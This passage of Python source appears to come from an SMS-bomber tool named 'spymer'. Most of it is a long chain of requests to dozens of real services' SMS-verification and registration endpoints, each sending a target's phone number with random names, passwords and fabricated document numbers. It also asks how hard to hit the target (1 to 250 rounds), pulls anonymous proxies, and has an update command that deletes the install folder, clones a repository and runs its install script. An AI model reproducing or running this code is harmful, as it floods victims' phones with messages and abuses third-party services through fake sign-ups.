                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://kilovkusa.ru/ajax.php', params={'block':'auth',  'action':'send_register_sms_code',  'data_type':'json'}, data={'phone': phonee})
                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://kaspi.kz/util/send-app-link', data={'address': phone9})
                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://izi.ua/api/auth/register', json={'phone':'+' + phone,  'name':name,  'is_terms_accepted':True})
                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://izi.ua/api/auth/sms-login', json={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone, maska='+## (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://iqlab.com.ua/session/ajaxregister', data={'cellphone': phonee})
                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'password':password,  'application':'lkp',  'login':'+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={'Referer': 'https://www.ingos.ru/cabinet/registration/personal'}, json={'Birthday':'1986-07-10T07:19:56.276+02:00',  'DocIssueDate':'2004-02-05T07:19:56.276+02:00',  'DocNumber':randint(500000, 999999),  'DocSeries':randint(5000, 9999),  'FirstName':name,  'Gender':'M',  'LastName':name,  'SecondName':name,  'Phone':phone9,  'Email':email})
                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://informatics.yandex/api/v1/registration/confirmation/phone/send/', data={'country':'RU',  'csrfmiddlewaretoken':'',  'phone':phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'mode':'request',  'phone':'+' + phone,  'phone_permission':'unknown',  'stream_id':0,  'v':3,  'appversion':'3.20.6',  'osversion':'unknown',  'devicemodel':'unknown'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://api.imgur.com/account/v1/phones/verify', json={'phone_number':phone,  'region_code':'RU'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn':phone,  'locale':'en',  'countryCode':'ru',  'version':'1',  'k':'ic1rtwz1s1Hj1O0r',  'r':'46763'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.get('https://api.hmara.tv/stable/entrance', params={'contact': phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://helsi.me/api/healthy/accounts/login', json={'phone':phone,  'platform':'PISWeb'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://www.hatimaki.ru/register/', data={'REGISTER[LOGIN]':phone,  'REGISTER[PERSONAL_PHONE]':phone,  'REGISTER[SMS_CODE]':'',  'resend-sms':'1',  'REGISTER[EMAIL]':'',  'register_submit_button':'Зарегистрироваться'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://guru.taxi/api/v1/driver/session/verify', json={'phone': {'code':1,  'number':phone9}})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={'phone':'+' + phone,  'grant_type':'password',  'client_id':'gcarAppMob',  'client_secret':'SomeRandomCharsAndNumbersMobile'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://friendsclub.ru/assets/components/pl/connector.php', data={'casePar':'authSendsms',  'MobilePhone':'+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://foodband.ru/api?call=calls', data={'customerName':name,  'phone':phonee,  'g-recaptcha-response':''})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.get('https://foodband.ru/api/', params={'call':'customers/sendVerificationCode',  'phone':phone9,  'g-recaptcha-response':''})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers={'Origin':'https://www.flipkart.com',  'X-user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop'}, data={'loginId': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={'Origin':'https://www.flipkart.com',  'X-user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop'}, json={'loginId':'+' + phone,  'supportAllStates':True})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={'register_call':'Y',  'action':'getCode',  'phone':'+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://www.finam.ru/api/smslocker/sendcode', data={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://2407.smartomato.ru/account/session', json={'phone':phonee,  'g-recaptcha-response':None})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://www.etm.ru/cat/runprog.html', data={'m_phone':phone9,  'mode':'sendSms',  'syf_prog':'clients-services',  'getSysParam':'yes'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.get('https://api.eldorado.ua/v1/sign/', params={'login':phone,  'step':'phone-check',  'fb_id':'null',  'fb_token':'null',  'lang':'ru'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                phonee = mask(str=phone, maska='+## (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://e-groshi.com/online/reg', data={'first_name':name,  'last_name':name,  'third_name':name,  'phone':phonee,  'password':password,  'password2':password})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://vladimir.edostav.ru/site/CheckAuthLogin', data={'phone_or_email': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://api.easypay.ua/api/auth/register', json={'phone':phone,  'password':password})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://my.dianet.com.ua/send_sms/', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://api.delitime.ru/api/v2/signup', data={'SignupForm[username]':phone,  'SignupForm[device_type]':3})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://api.creditter.ru/confirm/sms/send', json={'phone':phonee,  'type':'register'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://clients.cleversite.ru/callback/run.php', data={'siteid':'62731',  'num':phone,  'title':'Онлайн-консультант',  'referrer':'https://m.cleversite.ru/call'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://city24.ua/personalaccount/account/registration', data={'PhoneNumber': phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://cinema5.ru/api/phone_code', data={'phone': phonee})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://api.cian.ru/sms/v1/send-validation-code/', json={'phone':'+' + phone,  'type':'authenticateCode'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://api.carsmile.com/', json={'operationName':'enterPhone',  'variables':{'phone': phone},  'query':'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.get('https://it.buzzolls.ru:9995/api/v2/auth/register', params={'phoneNumber': '+' + phone}, headers={'keywordapi':'ProjectVApiKeyword',  'usedapiversion':'3'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone9, maska='(###)###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://bluefin.moscow/auth/register/', data={'phone':phonee,  'sendphone':'Далее'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://app.benzuber.ru/login', data={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://bartokyo.ru/ajax/login.php', data={'user_phone': phonee})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://bamper.by/registration/?step=1', data={'phone':'+' + phone,  'submit':'Запросить смс подтверждения',  'rules':'on'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone9, maska='(###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    requests.get('https://avtobzvon.ru/request/makeTestCall', params={'to': phonee})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://oauth.av.ru/check-phone', json={'phone': phonee})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://apteka.ru/_action/auth/getForm/', data={'form[NAME]':'',  'form[PERSONAL_GENDER]':'',  'form[PERSONAL_BIRTHDAY]':'',  'form[EMAIL]':'',  'form[LOGIN]':phonee,  'form[PASSWORD]':password,  'get-new-password':'Получите пароль по SMS',  'user_agreement':'on',  'personal_data_agreement':'on',  'formType':'simple',  'utc_offset':'120'})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            pass

                except:
                    pass

            def clear():
                os.system('cls' if os.name == 'nt' else 'clear')

            def checkver():
                global info
                ver = '80'
                version = requests.post('https://fsystem88.ru/spymer/version.php').json()['version']
                if int(ver) < int(version):
                    info = Back.RED + '\nВерсия устарела и нуждается в обновлении!' + Style.RESET_ALL

            def logo():
                logo = Fore.RED + ' ███████████████████████████████████████████ \n █───█────█────█─█─███──█────█─██─█───█────█ \n █─███─██─█─██─█─█─████─█─██─█─█─██─███─██─█ \n █───█────█─██─█─█─████─█─██─█──███───█────█ \n █─███─█─██─██─█─█─█─██─█─██─█─█─██─███─█─██ \n █─███─█─██────█───█────█────█─██─█───█─█─██ \n ███████████████████v.1.1███████████████████ ' + Style.RESET_ALL
                print(logo)
                print('\nЧто хочешь?')

            def checkspamlist():
                global info
                global phone
                print('Войдите в телефон для проверки:')
                phone = input(Fore.BLUE + 'spymer > ' + Style.RESET_ALL)
                make7phone()
                try:
                    if int(phone):
                        id = requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()['id']
                        if int(id) > 0:
                            info = Fore.GREEN + '\nТелефон {} находится в антиспам листе.'.format(phone) + Style.RESET_ALL
                        elif int(id) == 0:
                            info = Fore.RED + '\nТелефон {} не находится в антиспам листе.'.format(phone) + Style.RESET_ALL
                except:
                    info = Fore.RED + '\nНекорректно введен телефон!' + Style.RESET_ALL

            def addantispam():
                global info
                global phone
                print('Введите номер:')
                phone = input(Fore.BLUE + 'spymer > ' + Style.RESET_ALL)
                make7phone()
                try:
                    if int(phone):
                        id = requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()['id']
                        if int(id) > 0:
                            info = Fore.GREEN + '\nPhone {} is allready in antispam list.'.format(phone) + Style.RESET_ALL
                        elif int(id) == 0:
                            result = requests.post('https://fsystem88.ru/spymer/ajax.php', data={'phone': phone}).json()['result']
                            if result == 'no':
                                info = Fore.RED + '\nТелефон {} НЕ добавлен в антиспам лист.\nВо избежание DDoS подождите час с момента последнего доавления номера в антиспам.'.format(phone) + Style.RESET_ALL
                            elif result == 'yes':
                                info = Fore.GREEN + '\nТелефон {} добавлен в антиспам лист.'.format(phone) + Style.RESET_ALL
                            elif result == 'error':
                                info = Fore.RED + 'Ошибка' + Style.RESET_ALL
                except:
                    info = Fore.RED + '\nНекорректно введен телефон!' + Style.RESET_ALL

            def updateproxy():
                global info
                global proxy
                global ssl
                try:
                    print('Введите http(s)://IP:port proxy.')
                    print('Пример: ' + Fore.GREEN + 'https://123.45.6.78:8080' + Style.RESET_ALL)
                    print('Для отмены нажмите Ctrl+C')
                    prox = input(Fore.BLUE + 'spymer > ' + Style.RESET_ALL)
                    if prox[:5] == 'https':
                        ssl = 'https'
                        proxy = prox[8:]
                    elif prox[:5] == 'http:':
                        ssl = 'http'
                        proxy = prox[7:]
                    else:
                        info = Fore.RED + '\nНекорректно введены данные!' + Style.RESET_ALL
                        proxy = 'localhost'
                except:
                    info = Fore.RED + '\nНекорректно введены данные!' + Style.RESET_ALL
                    proxy = 'localhost'

            def generateproxy():
                global proxy
                global ssl
                url = 'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=500&country=RU&anonymity=elite&ssl=yes'
                a = requests.get(url)
                ssl = 'https'
                proxy = a.text.splitlines()[0]

            def make7phone():
                global phone
                if phone[0] == '+':
                    phone = phone[1:]
                elif phone[0] == '8':
                    phone = '7' + phone[1:]
                elif phone[0] == '9':
                    phone = '7' + phone

            def addparams():
                global email
                global name
                global password
                name = ''
                for x in range(12):
                    name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    email = '{}@gmail.com'.format(name)

            def update():
                a = input('Вы уверены, что хотите обновить? (y/n) ')
                if a == 'y':
                    os.system('cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh')
                    exit()
                else:
                    print('Отменено')

            def onesend():
                global info
                global phone
                global proxies
                clear()
                logo()
                print(info)
                print('Кого сегодня?: ("Enter" - отмена):')
                phone = input(Fore.BLUE + 'suckinator > ' + Style.RESET_ALL)
                try:
                    if int(phone):
                        print('Насколько жёстко?(от 1 до 250) ("Enter" - отмена):')
                        count = input(Fore.BLUE + 'suckinator > ' + Style.RESET_ALL)
                        try:
                            if int(count):
                                count = int(count)
                                make7phone()
                                iteration = 0
                                id = requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()['id']
                                if int(id) > 0:
